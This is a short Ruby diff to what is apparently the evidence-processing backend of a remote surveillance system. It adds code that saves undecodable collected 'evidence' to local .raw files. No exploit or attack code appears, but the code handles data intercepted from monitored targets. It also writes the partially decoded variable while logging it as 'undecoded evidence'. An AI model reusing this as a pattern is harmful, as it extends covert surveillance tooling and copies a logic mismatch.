@@ -81,8 +81,10 @@ class InstanceWorker
             raw = data.read
 
             # deserialize binary evidence and forward decoded
+            decoded_data = ''
             evidences, action = begin
               RCS::Evidence.new(@key).deserialize(raw) do |data|
+                decoded_data = data
               end
             rescue EmptyEvidenceError => e
               trace :info, "[#{evidence_id}:#{@ident}:#{@instance}] deleting empty evidence #{evidence_id}"
@@ -91,6 +93,12 @@ class InstanceWorker
             rescue EvidenceDeserializeError => e
               trace :warn, "[#{evidence_id}:#{@ident}:#{@instance}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
               RCS::DB::GridFS.delete(evidence_id, "evidence")
+
+              Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
+              path = "decoding_failed/#{evidence_id}.raw"
+              f = File.open(path, 'wb') {|f| f.write decoded_data}
+              trace :debug, "[#{evidence_id}] forwarded undecoded evidence #{evidence_id} to #{path}"
+
               next
             end
 
